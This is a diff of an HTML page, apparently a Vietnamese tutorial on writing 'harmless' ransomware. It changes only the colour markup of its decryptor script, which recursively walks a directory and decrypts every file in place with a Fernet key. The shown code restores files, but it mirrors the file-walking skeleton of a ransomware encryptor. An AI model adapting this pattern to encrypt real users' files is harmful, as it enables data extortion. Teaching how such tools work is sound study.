-</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-cipher.py&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;.a_deal&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-decipher.py&#34;</span>:
-</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">continue</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>listdir():
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> file <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;bill-cipher.py&#34;</span> <span style="color:#f92672">or</span> file <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;.a_deal&#34;</span> <span style="color:#f92672">or</span> file <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;bill-decipher.py&#34;</span>:
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">continue</span>
 </span></span><span style="display:flex;"><span>		
-</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">path</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isfile</span>(<span style="color:#e06c75">file</span>):
-</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">file</span>)
-</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">else</span>:
-</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#e06c75">file</span>)
-</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">sub_files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
-</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#98c379">&#34;..&#34;</span>)
-</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">for</span> <span style="color:#e06c75">subfile</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">sub_files</span>:
-</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">path</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">+</span> <span style="color:#98c379">&#34;/&#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">subfile</span>
-</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">path</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(file):
+</span></span><span style="display:flex;"><span>			files<span style="color:#f92672">.</span>append(file)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>			os<span style="color:#f92672">.</span>chdir(file)
+</span></span><span style="display:flex;"><span>			sub_files <span style="color:#f92672">=</span> find_files()
+</span></span><span style="display:flex;"><span>			os<span style="color:#f92672">.</span>chdir(<span style="color:#e6db74">&#34;..&#34;</span>)
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">for</span> subfile <span style="color:#f92672">in</span> sub_files:
+</span></span><span style="display:flex;"><span>				path <span style="color:#f92672">=</span> file <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> subfile
+</span></span><span style="display:flex;"><span>				files<span style="color:#f92672">.</span>append(path)
 </span></span><span style="display:flex;"><span>			
-</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">return</span> <span style="color:#e06c75">files</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> files
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
+</span></span><span style="display:flex;"><span>files <span style="color:#f92672">=</span> find_files()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#e06c75">files</span>)
+</span></span><span style="display:flex;"><span>print(files)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#98c379">&#34;.a_deal&#34;</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">deal</span>:
-</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">key</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">deal</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;.a_deal&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> deal:
+</span></span><span style="display:flex;"><span>	key <span style="color:#f92672">=</span> deal<span style="color:#f92672">.</span>read()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">files</span>:
-</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
-</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">content</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> files:
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">with</span> open(file, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>		content <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">content_decrypted</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span>(<span style="color:#e06c75">key</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">decrypt</span>(<span style="color:#e06c75">content</span>)
+</span></span><span style="display:flex;"><span>	content_decrypted <span style="color:#f92672">=</span> Fernet(key)<span style="color:#f92672">.</span>decrypt(content)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
-</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">content_decrypted</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">with</span> open(file, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>		f<span style="color:#f92672">.</span>write(content_decrypted)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;File đã được giải mã!&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;File đã được giải mã!&#34;</span>)
 </span></span></code></pre></div><p>Sau khi chúng ta chạy chương trình này, chúng ta có thể đọc lại nội dung gốc của các file đã bị mã hóa.</p>
 <p><img src="/img/harmless-ransomware/file1-decrypted.png" alt="file1-decrypted"></p>
 <p>Chúng ta cũng có thể xem lại các file ảnh và video.</p>
@@ -577,7 +577,7 @@
 
 
 
-<script type="text/javascript" src="/bundle.min.e89fda0f29b95d33f6f4224dd9e5cf69d84aff3818be2b0d73e731689cc374261b016d17d46f8381962fb4a1577ba3017b1f23509d894f6e66431f988c00889e.js" integrity="sha512-6J/aDym5XTP29CJN2eXPadhK/zgYvisNc&#43;cxaJzDdCYbAW0X1G&#43;DgZYvtKFXe6MBex8jUJ2JT25mQx&#43;YjACIng=="></script>
+<script type="text/javascript" src="/bundle.min.ad54ad97364f77ede35def9096b162bb1f0b3973aa50b080f5e82fa147f6882e2a7200d7535adbf9b51bebf939f1c1ca9bbe6be87530092aca720eac4a226fda.js" integrity="sha512-rVStlzZPd&#43;3jXe&#43;QlrFiux8LOXOqULCA9egvoUf2iC4qcgDXU1rb&#43;bUb6/k58cHKm75r6HUwCSrKcg6sSiJv2g=="></script>
 
 
 
